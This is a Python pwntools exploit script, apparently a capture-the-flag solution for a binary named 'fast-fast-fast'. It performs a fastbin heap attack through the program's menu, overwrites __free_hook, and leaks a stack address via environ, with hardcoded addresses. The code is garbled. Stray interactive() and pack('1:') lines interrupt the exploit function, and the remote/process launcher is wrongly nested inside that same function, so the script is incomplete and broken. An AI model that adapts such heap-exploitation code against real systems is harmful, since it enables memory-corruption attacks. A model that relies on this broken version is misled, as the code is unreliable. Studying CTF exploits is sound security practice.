#/usr/env/bin python
#-*- coding: utf-8 -*- 
from pwn import *
from struct import *
import sys
def creat_little(serect):
    io.sendlineafter('3 : saysecret\n',str(1))
    sleep(0.1)
    io.sendlineafter('3 : delet\n',str(1))
    sleep(0.1)
    io.sendafter('please input your secret\n',serect)
    sleep(0.1)
def edit_little(serect):
    io.sendlineafter('3 : saysecret\n',str(1))
    sleep(0.1)
    io.sendlineafter('3 : delet\n',str(2))
    sleep(0.1)
    io.sendafter('please input your secrert\n',serect)
    sleep(0.1)
def delet_little():
    io.sendlineafter('3 : saysecret\n',str(1))
    sleep(0.1)
    io.sendlineafter('3 : delet\n',str(3))
    sleep(0.1)
def creat_small(serect):
    io.sendlineafter('3 : saysecret\n',str(2))
    sleep(0.1)
    io.sendlineafter('3 : delet\n',str(1))
    sleep(0.1)
    io.sendafter('please input your secret\n',serect)
    sleep(0.1)
def edit_small(serect):
    io.sendlineafter('3 : saysecret\n',str(2))
    sleep(0.1)
    io.sendlineafter('3 : delet\n',str(2))
    sleep(0.1)
    io.sendafter('please input your secrert\n',serect)
    sleep(0.1)
def delet_small():
    io.sendlineafter('3 : saysecret\n',str(2))
    sleep(0.1)
    io.sendlineafter('3 : delet\n',str(3))
    sleep(0.1)
def saysecret():
    io.sendlineafter('3 : saysecret\n',str(3))
    sleep(0.1)
def read_it(read_addr):
    edit_little(p64(1)+p64(0xfb0)+read_addr)
    delet_small()
def write_it(write_addr,write_content):
    edit_little(p64(1)+p64(0xfb0)+write_addr)
    edit_small(write_content)
def exploit():
    #fastbin attack
    creat_little('A'*80)
    delet_little()
    creat_small('B'*84)
    delet_little()
    creat_little('C'*80)
    delet_little()
    edit_small(p64(0x6C4AA0))
    saysecret()
    creat_little(p64(0x6C4A80))
    #_free_hook ==> puts
    write_it(p64(0x6C3750),p64(0x408CF0))
    #leak stack_addr use *environ
    read_it(p64(0x6C3888))
    stack_addr = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
    log.info('stack_addr:'+hex(stack_addr))
    p = ''
    interactive()
    p += pack('1:')
    try:
        io = remote(sys.argv[1],sys.argv[2])
        exploit()
    except:
        io = process('./fast-fast-fast')
        exploit()